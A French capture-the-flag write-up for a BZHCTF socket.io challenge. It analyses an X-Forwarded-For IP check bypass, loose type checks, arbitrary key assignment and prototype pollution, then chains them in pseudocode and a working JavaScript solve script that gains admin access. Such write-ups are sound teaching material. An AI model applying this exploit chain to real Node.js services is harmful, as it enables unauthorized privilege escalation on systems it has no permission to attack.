# Writeup

## Prérequis

- Node.js
- yarn (facultatif)

`yarn` ou `npm i`

## Analyse de l'application

L'API de l'application est basée sur des websockets, plus précisément sur socket.io.

En listant les méthodes d'entrées de l'application, on résume le fonctionnement de l'appli à une poingé d'endpoints :

- Non authentifié :
  - `login` (username) : Log en tant que user classique
  - `loginAsBot` (username) : Se log en tant que bot, nécessite de venir de localhost
  - `loginAsAdmin` (username + password ?) : Se log en tant qu'admin avec un mdp qui n'a pas l'air d'être utile

- Authentifié en tant que bot
  - `reportClient` (username + reason) : report un client

- Authentifié en admin
  - `banClient` (message + reason) : bannir un client en se basant sur un message. La personne doit d’abord avoir été report par un bot pour être banni
  - `getBanList` : Liste les personnes bannies


## Recherche de code dangereux

1. **Possible bypass de filtrage par IP au travers du header `X-Forwarded-For`**
   
Lors de la connexion d'un bot, l'application vérifie que son address IP est `127.0.0.1` en se basant sur l'IP source ou sur le header `X-Forwarded-For`.

Dans le cas où le proxy ne gérerait pas correctement ce header. Un attaquant pourrait l'utiliser afin de se faire passer pour un bot en provenance de 127.0.0.1

```ts
const ip = [socket.handshake.headers['x-forwarded-for'], socket.handshake.address];

if (!ip.includes('127.0.0.1')) {
    throw new WsException('Unauthorized');
}
```

2. **Les conditions ne vérifient pas le type de manière stricte**
   
Dans la plupart des conditions contre des boolean, on ne retrouve pas de `=== true` qui permettrait de vérifier que la variable est bien un boolean.

Par exemple dans l'exemple suivant :

```ts
if (client.isAdmin) {
    socket.emit('onmessage', 'Welcome home admin, BZHCTF{}');
}
```
Pour cette condition, le test est validé pour les valeurs suivantes :
- `client.isAdmin = 'test'`
- `client.isAdmin = [1]`
- `client.isAdmin = {}`
- ...


3. **Controle d'une clef artitraire par l'utilisateur (manque de filtrage)**
   
La validation de la méthode `reportClient` est trop laxiste sur le contenu des arguments. Malgré le typage du champ `reason` de la class `ReportClientDto`, les décorateurs utilisés pour la validation des entrés utilisateurs ne vérifient pas l'appartenance à une énumération.

```ts
export class ReportClientDto {
	@IsNotEmpty()
	@IsString()
	reason: SusReason;
}
```

Ici le champs `reason` peut valoir n'importe quelle `string` valide malgré le typage par une énumération `SusReason` (Eh oui on est en Typescript, le typage est effectué au moment de la transpilation, mais pas au moment de l'éxecution)

Ce champ est passé par la suite à la méthode `ModerationService.sus(client: Client, reason: SusReason)` qui utilise la valeur contrôlée par l'utilisateur dans une clef d'un objet.
La méthode est appelée par un bot pour signaler un client.
```ts
function sus(client: Client, reason: SusReason) {
    client[reason] = 'suspicious';
    this.reportedUsers.add(client.username);
}
```
Dans la situation où un BOT malveillant appellerait cette méthode, il aurait la possibilité de définir n'importe quelle clef de l'object sur la valeur `"suspiciou"`

4. **Prototype pollution dans la méthode `ModerationService.getCanceledPeople()`**

La méthode `getCanceledPeople()` construit un objet à deux niveaux de profondeur en se basant uniquement sur des clefs contrôlable par des utilisateurs

```ts
const list = {};
for (const [username, [message, reason]] of this.bannedUsers) {
    if (!list[username]) {
        list[username] = {};
    }
    list[username][message] = reason;
}
```

- La variable `username` est défini par un admin lors du bannissement d'un utilisateur
- La variable `reason`est défini par un admin lors du bannissement d'un utilisateur
- La variable `message` est défini par le contenu du message envoyé par l'utilisateur banni

L'exécution d'une pollution de prototype est possible si `username = "__proto__"` avec `message` la clef à polluer et `reason` sa valeur

## Résumé des faiblesses

1. Unauthenticated -> `loginAsBot()` -> Bypass d'authent avec le header `X-Forwarded-For`
2. Unauthenticated -> `loginAsAdmin()` -> Manque de de vérification stricte du type `client.isAdmin`
3. Bot client -> `reportClient()` -> Un manque de vérification implique cause la pollution d'une clef arbitraire dans un objet du type `Client`
4. Admin client -> `getBanList()` -> Prototype polution

## Réflexion

> L'objectif final est de pouvoir appeler la méthode `loginAsAdmin()` et de passer la condition `if (client.isAdmin)`
> même si le code nous montre qu'il n'est pas pas possible en théorie de valider cette condition (même si on avait un mot de passe).

=> **On peut en déduire que le seul moyen de définir le champ `isAdmin` dès la connexion est d'exploiter une pollution de prototype (faille n.4) ou d'exploiter un bot pour se définir en tant qu'admin (faille n.3)**

=> Or, il n'est pas possible d'utiliser la faille n.3, car l'exploitation de cette faille agis sur un client déjà authentifié. Même si nous arrivions à avoir un client admin. Il serait trop tard pour appeler la méthode `loginAsAdmin()` à cause de la condition ligne 74 qui nous empêche de nous authentifier une deuxième fois.

=> On en déduit donc qu'il faut exécuter la prototype pollution avant l'appel à `loginAsAdmin()` :
```
... -- Proto pollution -- `loginAsAdmin()`
```

=> **Comment exploiter une prototype pollution ? Il faut réussir à  appeler la méthode `getCanceledPeople` accessible uniquement par un admin. On peut en déduire que le seul moyen est d'utiliser la faille n.3 pour passer un client en tant qu'admin**

La chaine d'exploitation serait la suivante :
```
... -- Écriture du champs client.isAdmin via un bot -- Proto pollution -- `loginAsAdmin()`
```
Notre problème est désormais de trouver comment obtenir un client Bot

=> **Comment obtenir un bot ? La seule condition à l'authentification en tant que bot est de provenir de localhost. On peut utiliser la faille n.1 pour bypass la vérification de l'IP source du client afin de s'authentifier en tant que bot**

On a notre chaine complête ! Le bypass IP étant exploitable sans prérequis
```
Bypass IP localhost -- Écriture du champs client.isAdmin via un bot -- Proto pollution -- `loginAsAdmin()`
```

## Exploitation

Nous n'allons pas pouvoir tout faire avec un seul client. Certaines failles agissent sur d'autres clients que soit-même. On va devoir créer plusieurs clients en parallèle pour enchainer les vulnérabilités :

```pseudocode
# Client_A sera notre client lambda qui sera transformé en admin
(UNAUTHENTICATED) Client_A = connect()
(UNAUTHENTICATED) Client_A -call-> Login
(USER) Client_A est désormait un user lambda

# Client_B sera notre bot en utilisant le bypass de contrôle d'IP source
(UNAUTHENTICATED) Client_B = connect()
(UNAUTHENTICATED) Client_B -call-> LoginAsBot # X-Forwarded-For=127.0.0.1
(BOT) Client_B est désormait un Bot ! Faille n.1

(BOT) Client_B -call-> reportClient{ username: client_A, reason: 'isAdmin' }
# Faille n.3 : Pollution de l'attribut isAdmin de l'objet Client
(ADMIN) Client_A est désormait ADMIN !

(UNAUTHENTICATED) Client_C = connect()
(UNAUTHENTICATED) CLient_C -call-> Login{ username: '__proto__' }
(USER) Client_C est désormait un user lambda avec le username __proto__
(USER) Client_C -call-> sendMessage(){ content: 'isAdmin' }

# On utilise notre client_B qui est un bot pour report l'utilisateur C
# C'est nécessaire car un admin ne peut pas banir sans qu'un bot ait d'abbord report
(BOT) Client_B -call-> reportClient(){ username: '__proto__', reason: 'NUDITY' }

# Puis on utilise notre client_A qui est un admin pour bannir l'utilisateur C
# On doit faire référence à un message envoyé par le client
(ADMIN) Client_A -call-> banClient(){ message: 'isAdmin', reason: 'whatever' }

# C'est l'heure d'éxecuter notre pollution de prototype (faille n.4)
(ADMIN) Client_A -call-> getBanList()
# La méthode getCanceledPeople va polluer notre object list de la manière suivante :
# list[username][message] = reason;
# avec username='__proto__',  message='isAdmin' et reason='whatever'
# Notre prototype est pollué !

# Pour finir on créer un dernier client qui va tenter de se connecter en admin
(UNAUTHENTICATED) Client_D = connect()
(UNAUTHENTICATED) Client_D -call-> loginAsAdmin() { username: 'a', password: 'b' }
# if (client.isAdmin) => Comme isAdmin n'est pas défini, on récupère la valeur du prototype
# qui vaut "whatever". On exploit alors la faiblesse n.2

(ADMIN) Client_D "Welcome home admin, BZHCTF{DontPutUserInputIntoYourKeys}"
```

## Script de solve

Voici une proposition d'implémentation JavaScript permettant de récupérer le flag:

```js
const io = require('socket.io-client');

// Util function : setTimeout as a Promise
const wait = async (time = 500) => new Promise(resolve => setTimeout(() => resolve(), time));

/**
 * Create a new socket
 * @returns {io.Socket}
 */
const createClient = async (options = {}) => await new Promise(resolve => {
    const socket = io('http://challenge.ctf.bzh:XXXXX/', options);
    
    socket.onAny((...args) => console.debug('[DEBUG]', ...args));
    
    socket.on('connect', () => {
        console.log('Connected');
        resolve(socket);
    });
});

const main = async () => {    
    // Create a second client, and abuse of the X-Forwarded-For header to log as a bot
    const botClient = await createClient({ extraHeaders: { 'X-Forwarded-For': '127.0.0.1' }});
    botClient.emit('loginAsBot', { username: 'evilBot' });
    
    // Create a first client and log in as a standard user
    const adminClient = await createClient();
    adminClient.emit('login', { username: 'Adam' });
    
    await wait();
    
    // // Now we have a bot client, report the standard user with a non-standard reason: isAdmin
    // // This will polute the Client object with isAdmin = 'suspiciou'
    botClient.emit('reportClient', { username: 'Adam', reason: 'isAdmin' });

    const client = await createClient();
    client.emit('login', { username: '__proto__' });

    await wait();

    client.emit('sendMessage', { message: 'isAdmin' });

    await wait();

    adminClient.emit('banClient', { message: 'isAdmin', reason: 'of course' });

    adminClient.emit('getBanList');

    await wait();

    const flagClient = await createClient();
    flagClient.emit('loginAsAdmin', { username: 'whatever', password: 'whatever' });
}

main();
```